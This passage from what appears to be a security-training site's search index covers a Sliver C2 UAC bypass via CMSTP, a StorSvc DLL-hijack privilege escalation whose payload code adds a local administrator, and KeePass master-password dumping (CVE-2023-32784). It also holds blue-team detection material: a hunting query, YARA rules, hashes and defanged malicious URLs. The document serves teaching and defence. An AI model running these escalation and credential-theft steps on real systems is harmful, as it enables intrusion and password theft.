SetForegroundWindow(WindowHandle); ShowWindow(WindowHandle, 5); return WindowHandle; } } Compile the code to .dll with the following command: Add-Type -TypeDefinition ([IO.File]::ReadAllText(\"$pwd\\Source.cs\")) -ReferencedAssemblies \"System.Windows.Forms\" -OutputAssembly \"CMSTP-UAC-Bypass.dll\" Read the class in the CMSTP-UAC-Bypass.dll file to the variable: [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\"$pwd\\CMSTP-UAC-Bypass.dll\")) The class will then be accessible and can be used within the script. The Execute method is used to run the Sliver beacon and write a payload file into the temp directory. [CMSTPBypass]::Execute(\"C:\\to\\beacon\\location\\caddy_beacon.exe\") This will initialise a high integrity cmd.exe popup on the target machine. The command getsystem can now be used in Sliver to start a new system session. The command beacon displays active beacons. The system account is selected with the use [PID] command.","title":"2.3 Privilege escalation"},{"location":"5-local-privilege-escalation/sliver/sliver/#for-blue-teams","text":"","title":"For blue teams"},{"location":"5-local-privilege-escalation/sliver/sliver/#threat-hunting","text":"A multilayered approach to security is required to safeguard operation security. This should include the use of endpoint detection and response (EDR) tools, network traffic analysis, and file system monitoring.","title":"Threat hunting"},{"location":"5-local-privilege-escalation/sliver/sliver/#lateral-movement","text":"","title":"Lateral movement"},{"location":"5-local-privilege-escalation/sliver/sliver/#remote-process-execution","text":"It is not always feasible to fingerprint the command-and-control (C2) communication protocol due to SSL encryption. Detecting lateral movement attempts is relatively easier, however. This can be illustrated with the psexec method of process execution. The attacker copies an executable (1), initiates the CreateServiceW request (2), and starts the service with the StartServiceW call (3). This method is widely used to gain unauthorized access to remote systems. During such operations the remote service name, service description, and the executable's upload location can be customized. Sliver additionally generates a random file name for each psexec execution. In this case it is hygienicu6.exe . The process does not appear in the main window of Task Manager. It is instead found under the Details tab. It can also be viewed in Procmon. Administrative shares may need to be enabled in order to execute processes remotely. In some cases this requires modification of the registry. This is achieved with the following command: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /f /v AutoShareWks /t REG_DWORD /d 1 . Default values for the ImagePath, DisplayName, and Description of the service installed on the remote system when using Sliver\u2019s PsExec command can be queried with the following command: | where ActionType == 'RegistryValueSet' | where (RegistryValueName == 'ImagePath' and RegistryValueData matches regex @'^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe') or (RegistryValueName == 'DisplayName' and RegistryValueData == 'Sliver') or (RegistryValueName == 'Description' and RegistryValueData == 'Sliver implant') When building a robust detection signature of a lateral movement technique it is important to rely on a sequence of events that don\u2019t change, rather than detecting specific strings or binary sequences in the network traffic (e.g., the default service name \u201cSliver\u201d, or the default target directory \u201cWindows\\Temp\u201d).","title":"Remote process execution"},{"location":"5-local-privilege-escalation/sliver/sliver/#network-traffic-analysis","text":"It is also possible to identify certain patterns and signatures associated with Sliver. Sliver's unique encryption algorithm can be detected through network traffic monitoring. Sliver use DNS, mTLs, WireGuard and HTTP(S) for callback protocols. All traffic is encrypted. Additional encoding can be used for further obfuscation. Lateral movement from Sliver is reasonably easy to detect in Wireshark. DNS traffic is of particular relevance to blue teams. The Sliver implant encodes its messages into subdomain requests and responses. The data is packaged and encoded in such a way as to maximize the amount of data sent in any single request. Encoded and encrypted payload data is limited to 254 characters per subdomain. There is a limited character count per request. C2 servers using DNS generate traffic significant orders of magnitude higher than protocols such as HTTP. This makes DNS logs a logical place to look for Sliver traces. This can be achieved by looking for subdomains with an excessive domain count or a large number of bytes per request.","title":"Network Traffic Analysis"},{"location":"5-local-privilege-escalation/sliver/sliver/#monitoring","text":"","title":"Monitoring"},{"location":"5-local-privilege-escalation/sliver/sliver/#yara","text":"Specific IP addresses, domain names, and ports used by C2 traffic can also be monitored. Daniel Roberson's Yara rule is an example of a useful tool in this context. rule sliver_client : c2 implant { meta: description = \"Bishop Fox's Sliver C2 Implant\" author = \"Daniel Roberson\" url = \"https://github.com/BishopFox/sliver\" strings: $s1 = \"github.com/bishopfox/sliver/client\" condition: all of them and filesize < 50MB } rule sliver_server : c2 { meta: description = \"Bishop Fox's Sliver C2 Server\" author = \"Daniel Roberson\" url = \"https://github.com/BishopFox/sliver\" strings: $s1 = \"RunSliver\" condition: all of them and filesize > 50MB }","title":"Yara"},{"location":"5-local-privilege-escalation/sliver/sliver/#file-system-monitoring","text":"This method involves monitoring the file system for executable files associated with Sliver and its Indicators of Compromise (IoCs). Organizations can detect the presence of Sliver C2 by monitoring these files and tracking changes to critical system files like the Windows registry. https://bazaar.abuse.ch/browse/signature/Sliver/ provides an updated list of IoCs to aid in this process. First seen SHA256 2023-01-05 19:38:07 3221de492e436a79655b4a82b72830a28de3aa417300fdf06e0b28202053ff3e 2023-01-05 19:37:00 1846c1db07d4f9a3a86605e38c0be5da38074b91cfafa1a72bccc693b06346e4 2022-12-16 19:20:46 f63993a7e4dc3e4242509482ca4d9ee1cbd4c00d219503ecf5d139d763a42f35 2022-07-18 08:00:49 78eb647f3d2aae5c52fcdc46ac1b27fb5a388ad39abbe614c0cfc902d223ccd6 2022-07-18 08:00:44 f13deec28f6f6d3f4f555f5a2db48cd8a541be52c331ccfccba929e4dfd6bc7a 2022-07-18 08:00:39 fa647a34b88c5409a58d2f2568147fa03112eb8bfa34bccd801830446213d7c4 2022-07-18 08:00:32 5568131f894caf1217f4cbda3dd40c1f39e680ce7727ed4a767cd1986e7805f0 2022-07-18 08:00:26 5c973707940097122ec97fcb73e7b14f054c11c7e1dd958efe933ae3c6a78c4e","title":"File System Monitoring"},{"location":"5-local-privilege-escalation/sliver/sliver/#endpoint-detection-and-response-edr-tools","text":"EDR tools are specifically designed to identify and respond to threats on endpoints. They can detect Sliver activity by observing specific behaviors. This includes the execution of malicious files or the establishment of particular network connections. Network indicators provided by https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221 are potentially useful resources in this regard. Indicator Type 43[.]128.62.42 IPv4 45[.]144.3.216 IPv4 hxxp://43.128.62.42/acl.exe URL hxxp://45.144.3.216/powercat.ps1 URL 5[.]199.173.103 IPv4 61[.]155.8.2 IPv4 hxxp://43.128.62.42:8888 URL hxxp://45.144.3.216/2.ps1 URL hxxp://45.144.3.216:14356 URL hxxp://5.199.173.103/7za.exe URL hxxp://5.199.173.103/syse.bat URL hxxp://5.199.173.103/t.zip URL","title":"Endpoint Detection and Response (EDR) Tools"},{"location":"5-local-privilege-escalation/sliver/sliver/#limitations","text":"Sliver supports various other methods to move laterally using third-party components. Modules can be installed using the armory command. Sliver's alias and extension package manager can install components such as SharpWMI, allow remote process creation via WMI, ServiceMove-BOF, abuse the Windows Perception Simulation Service, and SCShell. These rely on ChangeServiceConfigA to run commands. All these methods require tailored detections because the techniques employed greatly differ.","title":"Limitations"},{"location":"5-local-privilege-escalation/sliver/sliver/#sources","text":"AlienVault. (n.d.). AlienVault Open Threat Exchange. AlienVault . Retrieved June 13, 2023, from https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221 BishopFox. (n.d.). Sliver: Adversary Emulation Framework. GitHub . Retrieved May 17, 2023, from https://github.com/BishopFox/sliver Breen, K. (2023). Detecting and decrypting Sliver C2 \u2013 a threat hunter\u2019s guide. Immersive Labs . Retrieved June 13, 2023, from https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/ Cybereason (n.d.). Sliver C2 Leveraged by Many Threat Actors. Cybereason . Retrieved June 12, 2023, from https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors Seamless Intelligence. (n.d). Domain User to Domain Admin using Sliver. Seamless Intelligence . Retrieved May 17, 2023, from https://seamlessintelligence.com.au/sliver_2.html Marques, Z. (2018, October 31). How to bypass UAC in newer Windows versions. zc00l blog . Retrieved May 17, 2023, from https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html Microsoft (2023). Looking for the \u2018Sliver\u2019 lining: Hunting for emerging command-and-control frameworks. Microsoft Security Blog . Retrieved June 13, 2023, from https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/ Numen. (2023). Looking for the \u2018Sliver\u2019 lining - Getting System Shell with Sliver C2. Numen . Retrieved May 17, 2023, from https://www.numencyber.com/looking-for-the-sliver-lining/ Roberson, D. (2021, December 31). 100 Days of YARA \u2013 Day 36: Sliver Adversary Emulation Framework. DMFR SECURITY . Retrieved June 13, 2023, from https://dmfrsecurity.com/2022/01/24/100-days-of-yara-day-36-sliver-adversary-emulation-framework/","title":"Sources"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/","text":"StorSvc Abuse Background This exploit is a DLL-hijack used for local privilege escalation in Windows machines. The exploit is based on misusing Windows Storage Service and runs with SYSTEM privileges. It works by loading a missing DLL SprintCSP.dll when a specific RPC call SvcRebootToFlashingMode is made. An attacker transfers a compiled malicious version of the normally missing DLL and a modified version of RpcClient to the target machine. The RpcClient is tailored for the particular Windows version (10, 11, Server 2019, Server 2022). The attacker then writes the malicious DLL file into a folder in Windows PATH (iex. with LocalPotato exploit), followed by executing the modified RpcClient. This execution triggers the RPC Call which causes the Storage Service to load the missing DLL. The DLL file compiled by the attacker ( SprintCSP.dll ) is designed to abuse the Windows Storage Service. This technique was initially discovered by BlackArrowSec . According to the company, this DLL-hijack has been tested on Windows 10, Windows 11, Windows Server 2019 and Windows Server 2022. RpcClient versions have been precompiled and they can be found in binaries/RpcClients . The original PoC repository has been cloned into the directory LPE via StorSvc . Technical overview The RPC method SvcRebootToFlashingMode triggered by the execution of RpcClient causes another function to call ResetPhoneWorkerCallback which loads the SprintCSP.dll. From this DLL, a function FactoryResetUICC is searched for. That function will be called if it is found. As the attacker has provided the missing DLL containing the required function, it will be executed with SYSTEM privileges. Requirements The attacker must be able to write into a directory in the system PATH either find a writeable directory in path or utilize exploit like LocalPotato to gain write privileges The RpcClient.exe version must be correctly selected for the OS the specific version of RpcClient must be used Preparation Compile SprintCSP.dll : - 1. Edit the function DoStuff() in file LPE_via_StorSvc/SpringCSP/SprintCSP/main.c . Example below adds a user to local administrators group. void DoStuff() { // Replace all this code by your payload STARTUPINFO si = { sizeof(STARTUPINFO) }; PROCESS_INFORMATION pi; CreateProcess(L\"c:\\\\windows\\\\system32\\\\cmd.exe\",L\" /C net localgroup administrators user /add\", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L\"C:\\\\Windows\", &si, &pi); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return; } Save changes made to main.c and compile the library with msbuild or Microsoft Visual Studio Attack steps Transfer the compiled SprintCSP.dll and the correct version of RpcClient to victim host Write the DLL-file into a directory in PATH Execute the RpcClient Enjoy!","title":"StorSvc Abuse"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#storsvc-abuse","text":"","title":"StorSvc Abuse"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#background","text":"This exploit is a DLL-hijack used for local privilege escalation in Windows machines. The exploit is based on misusing Windows Storage Service and runs with SYSTEM privileges. It works by loading a missing DLL SprintCSP.dll when a specific RPC call SvcRebootToFlashingMode is made. An attacker transfers a compiled malicious version of the normally missing DLL and a modified version of RpcClient to the target machine. The RpcClient is tailored for the particular Windows version (10, 11, Server 2019, Server 2022). The attacker then writes the malicious DLL file into a folder in Windows PATH (iex. with LocalPotato exploit), followed by executing the modified RpcClient. This execution triggers the RPC Call which causes the Storage Service to load the missing DLL. The DLL file compiled by the attacker ( SprintCSP.dll ) is designed to abuse the Windows Storage Service. This technique was initially discovered by BlackArrowSec . According to the company, this DLL-hijack has been tested on Windows 10, Windows 11, Windows Server 2019 and Windows Server 2022. RpcClient versions have been precompiled and they can be found in binaries/RpcClients . The original PoC repository has been cloned into the directory LPE via StorSvc .","title":"Background"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#technical-overview","text":"The RPC method SvcRebootToFlashingMode triggered by the execution of RpcClient causes another function to call ResetPhoneWorkerCallback which loads the SprintCSP.dll. From this DLL, a function FactoryResetUICC is searched for. That function will be called if it is found. As the attacker has provided the missing DLL containing the required function, it will be executed with SYSTEM privileges.","title":"Technical overview"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#requirements","text":"The attacker must be able to write into a directory in the system PATH either find a writeable directory in path or utilize exploit like LocalPotato to gain write privileges The RpcClient.exe version must be correctly selected for the OS the specific version of RpcClient must be used","title":"Requirements"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#preparation","text":"Compile SprintCSP.dll : - 1. Edit the function DoStuff() in file LPE_via_StorSvc/SpringCSP/SprintCSP/main.c . Example below adds a user to local administrators group. void DoStuff() { // Replace all this code by your payload STARTUPINFO si = { sizeof(STARTUPINFO) }; PROCESS_INFORMATION pi; CreateProcess(L\"c:\\\\windows\\\\system32\\\\cmd.exe\",L\" /C net localgroup administrators user /add\", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L\"C:\\\\Windows\", &si, &pi); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return; } Save changes made to main.c and compile the library with msbuild or Microsoft Visual Studio","title":"Preparation"},{"location":"5-local-privilege-escalation/storsvc-privesc/storsvc_privesc/#attack-steps","text":"Transfer the compiled SprintCSP.dll and the correct version of RpcClient to victim host Write the DLL-file into a directory in PATH Execute the RpcClient Enjoy!","title":"Attack steps"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/","text":"LPE via StorSvc Windows Local Privilege Escalation via StorSvc service (writable SYSTEM path DLL Hijacking) Summary StorSvc is a service which runs as NT AUTHORITY\\SYSTEM and tries to load the missing SprintCSP.dll DLL when triggering the SvcRebootToFlashingMode RPC method locally. Description The StorSvc.dll!SvcRebootToFlashingMode RPC method, calls StorSvc.dll!InitResetPhone which also calls StorSvc.dll!ResetPhoneWorkerCallback , that tries to load SprintCSP.dll as shown in the image below: As this DLL is missing, it is loaded following the DLL Search Order flow and we can take advantage of this behaviour by placing a malicious DLL in a writable folder contained in the SYSTEM %PATH% . Then, the malicious DLL should be executed with SYSTEM privileges . It is worth noting that the service is launched as NT AUTHORITY\\SYSTEM in the service group LocalSystemNetworkRestricted which has the following privileges: Privilege Name Description State ============================ =================================================== ============= SeTcbPrivilege Act as part of the operating system Enabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled The command line that corresponds to this service is C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc . Proof of Concept In this repo we provide 2 different source codes: - RpcClient.exe : that triggers the RPC call. - SprintCSP.dll : which can be placed to exploit the DLL Hijacking. This PoC runs a whoami command and writes the output to C:\\ProgramData\\whoamiall.txt . If you want to expand the functionality of this PoC you can edit the DoStuff() function at main.c . The provided exploit should work by default and has been tested on Windows 10 , Windows 11 , Windows Server 2019 and Windows Server 2022 . In order to make it work, the #define macro at storsvc_c.c must be changed so the exploit is adapted to the target machine's operative system. After triggering the exploit it is necessary to stop or reboot the service, which SprintCSP.dll already does. Steps Find writable SYSTEM path with reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -v Path Copy SprintCSP.dll to the writable path Execute RpcClient.exe Check C:\\ProgramData\\whoamiall.txt References Fuzzing Windows RPC with RpcView CdpSvcLPE CDPSvc DLL Hijacking - From LOCAL SERVICE to SYSTEM","title":"LPE via StorSvc"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#lpe-via-storsvc","text":"Windows Local Privilege Escalation via StorSvc service (writable SYSTEM path DLL Hijacking)","title":"LPE via StorSvc"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#summary","text":"StorSvc is a service which runs as NT AUTHORITY\\SYSTEM and tries to load the missing SprintCSP.dll DLL when triggering the SvcRebootToFlashingMode RPC method locally.","title":"Summary"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#description","text":"The StorSvc.dll!SvcRebootToFlashingMode RPC method, calls StorSvc.dll!InitResetPhone which also calls StorSvc.dll!ResetPhoneWorkerCallback , that tries to load SprintCSP.dll as shown in the image below: As this DLL is missing, it is loaded following the DLL Search Order flow and we can take advantage of this behaviour by placing a malicious DLL in a writable folder contained in the SYSTEM %PATH% . Then, the malicious DLL should be executed with SYSTEM privileges . It is worth noting that the service is launched as NT AUTHORITY\\SYSTEM in the service group LocalSystemNetworkRestricted which has the following privileges: Privilege Name Description State ============================ =================================================== ============= SeTcbPrivilege Act as part of the operating system Enabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled The command line that corresponds to this service is C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc .","title":"Description"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#proof-of-concept","text":"In this repo we provide 2 different source codes: - RpcClient.exe : that triggers the RPC call. - SprintCSP.dll : which can be placed to exploit the DLL Hijacking. This PoC runs a whoami command and writes the output to C:\\ProgramData\\whoamiall.txt . If you want to expand the functionality of this PoC you can edit the DoStuff() function at main.c . The provided exploit should work by default and has been tested on Windows 10 , Windows 11 , Windows Server 2019 and Windows Server 2022 . In order to make it work, the #define macro at storsvc_c.c must be changed so the exploit is adapted to the target machine's operative system. After triggering the exploit it is necessary to stop or reboot the service, which SprintCSP.dll already does.","title":"Proof of Concept"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#steps","text":"Find writable SYSTEM path with reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -v Path Copy SprintCSP.dll to the writable path Execute RpcClient.exe Check C:\\ProgramData\\whoamiall.txt","title":"Steps"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#references","text":"Fuzzing Windows RPC with RpcView CdpSvcLPE CDPSvc DLL Hijacking - From LOCAL SERVICE to SYSTEM","title":"References"},{"location":"5-local-privilege-escalation/storsvc-privesc/LPE_via_StorSvc/#_1","text":"","title":""},{"location":"6-credential-access/keepass-password-dumper/keepass/","text":"KeePass Password Dumper Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/vdohney/keepass-password-dumper Background KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character. Tool format The tool comes in a format of a VS Studio C# project. There is no prebuilt binary because binaries cannot be built directly from the C# project. A way to execute the exploit against a memory dump file is to run the code with dotnet (shown later in the documentation). Practical exploitation requirements The KeePass version should be <= 2.53.1 The (attacker) machine executing the C# exploit code against the memory dump should have .NET SDK Framework v. 7.0 installed Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work) Environment and tool setup Download and install Microsoft .NET SDK v. 7.0 to the attacking machine Get the exploit code repository to the attacking machine. A copy of the PoC repository is located in the keepass-dumper directory. The repository can be opened and cloned from the link below: https://github.com/vdohney/keepass-password-dumper Install a suitable version of KeePass (to the victim machine). Installers for versions 2.52 (.msi) and 2.53.1 (installer application) can be found in the directory installers . note : If the installer asks for permission to enable automatic update for KeePass, deny the permission Cracking the DB password Acquire a memory dump containing the data of the whole KeePass process. It is recommended to move the dump file to the repository directory. Run the dumper code in the repository directory using the syntax below (PowerShell or Command prompt). The program will print a vast amount of output but the relevant part is at the end. dotnet run <PATH_TO_DUMP> # example dotnet run KeePass.dmp The dotnet command must be executed in the directory which contains the C# code. Inspect and analyze the output. Take the required actions to either guess or brute-force the password. Analysing the output The figure below shows the relevant output after executing the dump code against a dump of KeePass version 2.53.1. Only the first character of the master password remained undiscovered. The output on different lines ( Character position.: OUTPUT ) has the following logic: 1.: * -> The first character is unknown 2.: b,c,d,e,) -> The character number 2 is either b, c, d, e or ) 3.: c, -> The character number 3 is c","title":"KeePass Password Dumper"},{"location":"6-credential-access/keepass-password-dumper/keepass/#keepass-password-dumper","text":"Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/vdohney/keepass-password-dumper","title":"KeePass Password Dumper"},{"location":"6-credential-access/keepass-password-dumper/keepass/#background","text":"KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character.","title":"Background"},{"location":"6-credential-access/keepass-password-dumper/keepass/#tool-format","text":"The tool comes in a format of a VS Studio C# project. There is no prebuilt binary because binaries cannot be built directly from the C# project. A way to execute the exploit against a memory dump file is to run the code with dotnet (shown later in the documentation).","title":"Tool format"},{"location":"6-credential-access/keepass-password-dumper/keepass/#practical-exploitation-requirements","text":"The KeePass version should be <= 2.53.1 The (attacker) machine executing the C# exploit code against the memory dump should have .NET SDK Framework v. 7.0 installed Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work)","title":"Practical exploitation requirements"},{"location":"6-credential-access/keepass-password-dumper/keepass/#environment-and-tool-setup","text":"Download and install Microsoft .NET SDK v. 7.0 to the attacking machine Get the exploit code repository to the attacking machine. A copy of the PoC repository is located in the keepass-dumper directory. The repository can be opened and cloned from the link below: https://github.com/vdohney/keepass-password-dumper Install a suitable version of KeePass (to the victim machine). Installers for versions 2.52 (.msi) and 2.53.1 (installer application) can be found in the directory installers . note : If the installer asks for permission to enable automatic update for KeePass, deny the permission","title":"Environment and tool setup"},{"location":"6-credential-access/keepass-password-dumper/keepass/#cracking-the-db-password","text":"Acquire a memory dump containing the data of the whole KeePass process. It is recommended to move the dump file to the repository directory. Run the dumper code in the repository directory using the syntax below (PowerShell or Command prompt). The program will print a vast amount of output but the relevant part is at the end. dotnet run <PATH_TO_DUMP> # example dotnet run KeePass.dmp The dotnet command must be executed in the directory which contains the C# code. Inspect and analyze the output. Take the required actions to either guess or brute-force the password.","title":"Cracking the DB password"},{"location":"6-credential-access/keepass-password-dumper/keepass/#analysing-the-output","text":"The figure below shows the relevant output after executing the dump code against a dump of KeePass version 2.53.1. Only the first character of the master password remained undiscovered. The output on different lines ( Character position.: OUTPUT ) has the following logic: 1.: * -> The first character is unknown 2.: b,c,d,e,) -> The character number 2 is either b, c, d, e or ) 3.: c, -> The character number 3 is c","title":"Analysing the output"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/","text":"KeePass Password Dumper Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/CMEPW/keepass-dump-masterkey Background KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character. Practical exploitation requirements The KeePass version should be <= 2.53.1 Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work) Cracking the DB password Acquire a memory dump containing the data of the whole KeePass process. Run python script to analyze the dump file ``` python3 poc.py example python3 poc.py KeePass.exe.2.52.dmp ``` Analysing the output The figure below shows the output of poc.py after it analyzed dump of KeePass version 2.52. First character of the master password remained undiscovered. In this case program provided 11 different possibilities for the 2nd letter of the password.","title":"KeePass Password Dumper"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/#keepass-password-dumper","text":"Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/CMEPW/keepass-dump-masterkey","title":"KeePass Password Dumper"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/#background","text":"KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character.","title":"Background"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/#practical-exploitation-requirements","text":"The KeePass version should be <= 2.53.1 Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work)","title":"Practical exploitation requirements"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/#cracking-the-db-password","text":"Acquire a memory dump containing the data of the whole KeePass process. Run python script to analyze the dump file ``` python3 poc.py example python3 poc.py KeePass.exe.2.52.dmp ```","title":"Cracking the DB password"},{"location":"6-credential-access/keepass-password-dumper/keepass_python/#analysing-the-output","text":"The figure below shows the output of poc.py after it analyzed dump of KeePass version 2.52. First character of the master password remained undiscovered. In this case program provided 11 different possibilities for the 2nd letter of the password.","title":"Analysing the output"},{"location":"6-credential-access/keepass-password-dumper/keepass-dumper/","text":"KeePass 2.X Master Password Dumper ( CVE-2023-32784 ) Update The vulnerability was assigned CVE-2023-32784 . It should be fixed in KeePass 2.54, which should come out in the beginning of June 2023 . Thanks again to Dominik Reichl for his fast response and creative fix! Clarification: the password has to be typed on a keyboard, not copied from a clipboard (see the How it works sections). What can you do First, update to KeePass 2.54 or higher once available. Second, if you've been using KeePass for a long time, your master password (and potentially other passwords) could be in your pagefile/swapfile, hibernation file and crash dump(s). Depending on your paranoia level, you can consider these steps to resolve the issue: Change your master password Delete crash dumps (depends on your OS, on Windows at least C:\\Windows\\memory.dmp , but maybe there are others) Delete hibernation file Delete pagefile/swapfile (can be quite annoying, don't forget to enable it back again) Overwrite deleted data on the HDD to prevent carving (e.g. Cipher with /w on Windows) Restart your computer Or just overwrite your HDD and do a fresh install of your OS. Incomplete list of products that are not impacted (please create a pull request or an issue for adding more). Rule of thumb is that if it isn't the original KeePass 2.X app written in .NET, it's likely not affected. KeePassXC Strongbox KeePass 1.X ---- KeePass Master Password Dumper is a simple proof-of-concept tool used to dump the master password from KeePass's memory. Apart from the first password character, it is mostly able to recover the password in plaintext. No code execution on the target system is required, just a memory dump. It doesn't matter where the memory comes from - can be the process dump, swap file ( pagefile.sys ), hibernation file ( hiberfil.sys ), various crash dumps or RAM dump of the entire system. It doesn't matter whether or not the workspace is locked . It is also possible to dump the password from RAM after KeePass is no longer running, although the chance of that working goes down with the time it's been since then. Tested with KeePass 2.53.1 on Windows (English) and KeePass 2.47 on Debian (keepass2 package). It should work for the macOS version as well. Unfortunately, enabling the Enter master key on secure desktop option doesn't help in preventing the attack. PoC might have issues with databases created by older versions of KeePass, but I wasn't able to reproduce it (see issue #4 ). Finding was confirmed by Dominik Reichl, KeePass's author, here . I appreciate Dominik's fast response. Hopefully it will be fixed soon! Setup Install .NET (most major operating systems supported). Clone the repository: git clone https://github.com/vdohney/keepass-password-dumper or download it from GitHub Enter the project directory in your terminal (Powershell on Windows) cd keepass-password-dumper dotnet run PATH_TO_DUMP The easiest way to test this on Windows is to create a process dump in the task manager by right-clicking the KeePass process and selecting \"Create dump file\". Alternatively you can add another parameter dotnet run PATH_TO_DUMP PATH_TO_PWDLIST to generate a list of all possible passwords beginning from the second character. Should You Be Worried? Depends on your threat model. If your computer is already infected by malware that's running in the background with the privileges of your user, this finding doesn't make your situation much worse. However, it might be easier for the malware to be stealthy and evade the antivirus, since unlike KeeTheft or KeeFarce, no process injection or other type of code execution is necessary. If you have a reasonable suspicion that someone could obtain access to your computer and conduct forensic analysis, this could be bad. Worst case scenario is that the master password will be recovered, despite KeePass being locked or not running at all. If you use full disk encryption with a strong password and your system is clean, you should be fine. No one can steal your passwords remotely over the internet with this finding alone. How It Works KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx . This text box is not only used for the master password entry, but in other places in KeePass as well, like password edit boxes (so the attack can also be used to recover their contents). The flaw exploited here is that for every character typed, a leftover string is created in memory. Because of how .NET works, it is nearly impossible to get rid of it once it gets created. For example, when \"Password\" is typed, it will result in these leftover strings: \u2022a, \u2022\u2022s, \u2022\u2022\u2022s, \u2022\u2022\u2022\u2022w, \u2022\u2022\u2022\u2022\u2022o, \u2022\u2022\u2022\u2022\u2022\u2022r, \u2022\u2022\u2022\u2022\u2022\u2022\u2022d. The POC application searches the dump for these patterns and offers a likely password character for each position in the password. Reliability of this attack can be influenced depending on how the password was typed and how many passwords were typed per session. However, I've discovered that even if there are multiple passwords per session or typos, the way .NET CLR allocates these strings means that they are likely to be nicely ordered in memory. So if three different passwords were typed, you are likely to get three candidates for each character position in that order, which makes it possible to recover all three passwords. Dev It's a quick POC, so likely not very reliable and robust. Please create a pull request if you happen to find an issue and fix it. Allowed password characters are currently hardcoded like this: 